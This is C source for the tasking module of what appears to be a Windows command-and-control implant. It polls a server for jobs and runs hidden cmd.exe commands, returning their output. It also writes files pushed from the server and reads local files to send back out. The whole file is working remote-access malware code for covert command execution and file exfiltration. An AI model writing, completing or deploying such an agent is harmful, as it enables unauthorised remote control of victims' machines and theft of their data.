#include "Command.h"
#include "Package.h"
#include <stdio.h>

extern UINT32   g_AgentID;
extern DWORD    g_SleepTime;
extern BOOL     g_Connected;


VOID TaskParserNew(PTASK_PARSER Parser, PVOID Buffer, UINT32 Size, UINT32 Endian){
    Parser->Buffer = (PUCHAR)Buffer;
    Parser->Length = Size;
    Parser->Endian = Endian;
}

UINT32 TaskParserGetInt32(PTASK_PARSER Parser){
    if (Parser->Length < 4)
        return 0;

    PUCHAR B = Parser->Buffer;
    UINT32 val;

    if (Parser->Endian == ENDIAN_BIG)
        val = (B[0] << 24) | (B[1] << 16) | (B[2] << 8) | B[3];
    else
        val = (B[3] << 24) | (B[2] << 16) | (B[1] << 8) | B[0];

    Parser->Buffer += 4;
    Parser->Length -= 4;
    return val;
}

PCHAR TaskParserGetBytes(PTASK_PARSER Parser, PUINT32 OutSize){
    UINT32 sz = TaskParserGetInt32(Parser);

    if (sz == 0 || sz > Parser->Length){
        if (OutSize) *OutSize = 0;
        return NULL;
    }

    PCHAR ptr = (PCHAR)Parser->Buffer;
    Parser->Buffer += sz;
    Parser->Length -= sz;

    if (OutSize) *OutSize = sz;
    return ptr;
}

UINT32 DetectEndianness(PVOID Buffer, UINT32 Size){
    if (Size < 4)
        return ENDIAN_LITTLE;

    PUCHAR B = (PUCHAR)Buffer;
    UINT32 be = (B[0] << 24) | (B[1] << 16) | (B[2] << 8) | B[3];
    UINT32 le = (B[3] << 24) | (B[2] << 16) | (B[1] << 8) | B[0];

    if (be == COMMAND_NO_JOB || be == COMMAND_GET_JOB || be == COMMAND_OUTPUT)
        return ENDIAN_BIG;
    if (le == COMMAND_NO_JOB || le == COMMAND_GET_JOB || le == COMMAND_OUTPUT)
        return ENDIAN_LITTLE;

    return ENDIAN_LITTLE; // handler packer default
}


VOID CommandShell(PTASK_PARSER Parser){
    UINT32  dwLen           = 0;
    PCHAR   Cmd             = NULL;
    HANDLE  hStdOutRd       = NULL;
    HANDLE  hStdOutWr       = NULL;
    HANDLE  hStdInRd        = NULL;
    HANDLE  hStdInWr        = NULL;
    CHAR    buf[4096]       = { 0 };

    PROCESS_INFORMATION pi  = { 0 };
    SECURITY_ATTRIBUTES sa  = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    STARTUPINFOA        si  = { 0 };

    Cmd = TaskParserGetBytes(Parser, &dwLen);
    if (!Cmd || dwLen == 0) return;

    int off = wsprintfA(buf, "cmd.exe /c ");
    if (dwLen >= sizeof(buf) - off) dwLen = sizeof(buf) - off - 1;
    memcpy(buf + off, Cmd, dwLen);

    if (!CreatePipe(&hStdInRd, &hStdInWr, &sa, 0))
        return;

    if (!CreatePipe(&hStdOutRd, &hStdOutWr, &sa, 0)){
        CloseHandle(hStdInRd);
        CloseHandle(hStdInWr);
        return;
    }

    si.cb         = sizeof(STARTUPINFOA);
    si.dwFlags    = STARTF_USESTDHANDLES;
    si.hStdError  = hStdOutWr;
    si.hStdOutput = hStdOutWr;
    si.hStdInput  = hStdInRd;

    if (!CreateProcessA(NULL, buf, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)){
        CloseHandle(hStdInRd);  CloseHandle(hStdInWr);
        CloseHandle(hStdOutRd); CloseHandle(hStdOutWr);
        return;
    }

    CloseHandle(hStdOutWr);
    CloseHandle(hStdInRd);

    PVOID  pOut     = LocalAlloc(LPTR, 1);
    DWORD  dwOut    = 0;
    UCHAR  tmp[1024];
    DWORD  dwRead   = 0;

    while (ReadFile(hStdOutRd, tmp, sizeof(tmp) - 1, &dwRead, NULL) && dwRead > 0){
        pOut = LocalReAlloc(pOut, dwOut + dwRead, LMEM_MOVEABLE | LMEM_ZEROINIT);
        memcpy((PUCHAR)pOut + dwOut, tmp, dwRead);
        dwOut += dwRead;
    }

    WaitForSingleObject(pi.hProcess, INFINITE);

    PPACKAGE Pkg = PackageCreate(COMMAND_OUTPUT);
    PackageAddBytes(Pkg, (PUCHAR)pOut, dwOut);
    PackageTransmit(Pkg, NULL, NULL);

    LocalFree(pOut);
    CloseHandle(hStdOutRd);
    CloseHandle(hStdInWr);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}


VOID CommandUpload(PTASK_PARSER Parser){
    UINT32  nameLen  = 0;
    UINT32  fileSize = 0;
    PCHAR   fileName = TaskParserGetBytes(Parser, &nameLen);
    PVOID   content  = TaskParserGetBytes(Parser, &fileSize);
    DWORD   written  = 0;

    if (!fileName || !content) return;

    CHAR nameBuf[MAX_PATH] = { 0 };
    if (nameLen >= sizeof(nameBuf)) nameLen = sizeof(nameBuf) - 1;
    memcpy(nameBuf, fileName, nameLen);

    HANDLE hFile = CreateFileA(nameBuf, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        return;

    WriteFile(hFile, content, fileSize, &written, NULL);
    CloseHandle(hFile);

    PPACKAGE Pkg = PackageCreate(COMMAND_OUTPUT);
    char msg[512];
    int msgLen = wsprintfA(msg, "uploaded %s (%lu bytes)", nameBuf, written);
    PackageAddBytes(Pkg, (PUCHAR)msg, msgLen);
    PackageTransmit(Pkg, NULL, NULL);
}

VOID CommandDownload(PTASK_PARSER Parser){
    UINT32 nameLen  = 0;
    PCHAR  fileName = TaskParserGetBytes(Parser, &nameLen);

    if (!fileName) return;

    CHAR nameBuf[MAX_PATH] = { 0 };
    if (nameLen >= sizeof(nameBuf)) nameLen = sizeof(nameBuf) - 1;
    memcpy(nameBuf, fileName, nameLen);

    HANDLE hFile = CreateFileA(nameBuf, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        return;

    DWORD fileSize = GetFileSize(hFile, NULL);
    PVOID fileBuf  = LocalAlloc(LPTR, fileSize);
    DWORD dwRead   = 0;

    if (!ReadFile(hFile, fileBuf, fileSize, &dwRead, NULL)){
        CloseHandle(hFile);
        LocalFree(fileBuf);
        return;
    }
    CloseHandle(hFile);

    PPACKAGE Pkg = PackageCreate(COMMAND_DOWNLOAD);
    PackageAddBytes(Pkg, (PUCHAR)nameBuf, strlen(nameBuf));
    PackageAddBytes(Pkg, fileBuf, dwRead);
    PackageTransmit(Pkg, NULL, NULL);

    LocalFree(fileBuf);
}

VOID CommandExit(PTASK_PARSER Parser){
    ExitProcess(0);
}

#define COMMAND_COUNT 4

static COMMAND_ENTRY CommandTable[COMMAND_COUNT] = {
    { .ID = COMMAND_SHELL,    .Function = CommandShell },
    { .ID = COMMAND_UPLOAD,   .Function = CommandUpload },
    { .ID = COMMAND_DOWNLOAD, .Function = CommandDownload },
    { .ID = COMMAND_EXIT,     .Function = CommandExit },
};

VOID CommandDispatcher(VOID){
    PPACKAGE    Package    = NULL;
    PVOID       Data       = NULL;
    SIZE_T      Size       = 0;

    do {
        if (!g_Connected)
            return;

        Sleep(g_SleepTime * 1000);

        Package = PackageCreate(COMMAND_GET_JOB);
        PackageAddInt32(Package, g_AgentID);

        if (!PackageTransmit(Package, &Data, &Size)){
            break;
        }

        if (!Data || Size < 4)
            break;

        UINT32 endian = DetectEndianness(Data, Size);
        TASK_PARSER Parser = { 0 };
        TaskParserNew(&Parser, Data, Size, endian);

        UINT32 first = TaskParserGetInt32(&Parser);
        if (first == COMMAND_NO_JOB)
            goto next;

        while (Parser.Length >= 4){
            UINT32 cmd = TaskParserGetInt32(&Parser);

            if (cmd == COMMAND_NO_JOB)
                break;

            BOOL found = FALSE;
            for (UINT32 i = 0; i < COMMAND_COUNT; i++){
                if (CommandTable[i].ID == cmd){
                    CommandTable[i].Function(&Parser);
                    found = TRUE;
                    break;
                }
            }

            if (!found)
                printf("[dispatch] unknown cmd: 0x%x\n", cmd);
        }

next:
        if (Data){
            memset(Data, 0, Size);
            LocalFree(Data);
            Data = NULL;
        }

    } while (TRUE);

    g_Connected = FALSE;
}
